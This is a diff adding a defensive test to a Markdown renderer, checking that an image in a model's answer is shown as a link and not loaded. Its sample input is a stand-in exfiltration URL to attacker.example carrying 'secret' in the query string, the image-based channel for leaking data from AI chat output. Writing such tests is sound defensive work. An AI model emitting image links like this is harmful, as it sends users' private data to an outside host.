@@ -27,6 +27,15 @@ describe('MarkdownView', () => {
     expect(container.querySelector('b')).toBeNull()
   })
 
+  it('never loads a Markdown image, so a model answer cannot send data to a remote host', () => {
+    const { container } = render(
+      <MarkdownView text={'![chart](https://attacker.example/pixel.png?d=secret)'} />,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    const link = screen.getByRole('link', { name: /chart/ })
+    expect(link).toHaveAttribute('href', 'https://attacker.example/pixel.png?d=secret')
+  })
+
   it('opens links in a new tab, away from the unsaved draft', () => {
     render(<MarkdownView text="[docs](https://example.com)" />)
     const link = screen.getByRole('link', { name: 'docs' })
